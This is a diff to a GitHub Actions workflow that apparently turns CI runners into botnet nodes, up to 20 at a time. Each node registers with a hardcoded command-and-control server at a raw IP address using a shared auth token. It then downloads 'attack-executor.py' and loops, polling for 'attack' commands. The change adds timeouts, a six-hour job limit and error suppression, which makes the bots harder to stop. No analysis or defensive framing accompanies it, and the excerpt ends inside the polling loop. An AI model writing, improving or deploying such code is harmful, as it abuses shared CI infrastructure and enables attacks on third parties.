@@ -8,6 +8,7 @@ on:
 jobs:
   bot:
     runs-on: ubuntu-latest
+    timeout-minutes: 360
     strategy:
       max-parallel: 20
       matrix:
@@ -19,18 +20,18 @@ jobs:
           BOT="gh-${{ matrix.slice }}-$(head -c4 /dev/urandom | md5sum | cut -c1-6)"
           echo "[+] $BOT alive"
 
-          curl -s -X POST http://216.167.26.154:1337/api/register \
+          curl -s --connect-timeout 5 --max-time 10 -X POST http://216.167.26.154:1337/api/register \
             -H "Content-Type: application/json" \
-            -d '{"auth":"enibot2024","id":"'"$BOT"'","ip":"0.0.0.0","hostname":"gh","os":"linux","arch":"x86_64","method":"python"}'
+            -d '{"auth":"enibot2024","id":"'"$BOT"'","ip":"0.0.0.0","hostname":"gh","os":"linux","arch":"x86_64","method":"python"}' || true
 
-          curl -s http://216.167.26.154:1337/attack-executor.py -o /tmp/ex.py
+          curl -s --connect-timeout 5 --max-time 10 http://216.167.26.154:1337/attack-executor.py -o /tmp/ex.py || true
 
           while true; do
-            curl -s -X POST http://216.167.26.154:1337/api/heartbeat \
+            curl -s --connect-timeout 5 --max-time 10 -X POST http://216.167.26.154:1337/api/heartbeat \
               -H "Content-Type: application/json" \
               -d '{"id":"'"$BOT"'"}' > /dev/null 2>&1 || true
 
-            C=$(curl -s "http://216.167.26.154:1337/api/poll?id=$BOT" 2>/dev/null || true)
+            C=$(curl -s --connect-timeout 5 --max-time 10 "http://216.167.26.154:1337/api/poll?id=$BOT" 2>/dev/null || true)
 
             if echo "$C" | grep -q '"type": "attack"' 2>/dev/null; then
               echo "$C" > /tmp/cmds.json
